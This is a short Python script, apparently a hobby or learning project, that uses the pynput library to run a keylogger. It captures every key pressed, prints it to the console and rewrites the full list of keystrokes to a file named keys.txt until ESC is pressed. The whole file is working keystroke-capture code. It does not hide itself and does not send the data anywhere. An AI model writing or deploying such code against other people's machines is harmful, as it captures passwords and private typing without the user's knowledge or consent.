from pynput.keyboard import Key, Listener

keys = []


def on_press(key):
    """Captures key strokes
     Appends them in a list
     Writes them in a file"""
    keys.append(key)
    write()
    try:
        print(f'Key {key} has been pressed')
    except AttributeError:
        print('Alphanumeric key pressed')


def on_release(key):
    """Notify when key is pressed
    Return false if ESC is pressed"""
    print(f'Key {key} has been released')
    if key == Key.esc:
        return False


def write():
    """Write key strokes to file"""
    with open('keys.txt', 'w') as file:
        for key in keys:
            k = str(key).replace("'", "")
            file.write(k)
            file.write(" ")


# Continuously listen for key strokes
with Listener(on_press=on_press, on_release=on_release) as listener:
    print('Key logger started')
    listener.join()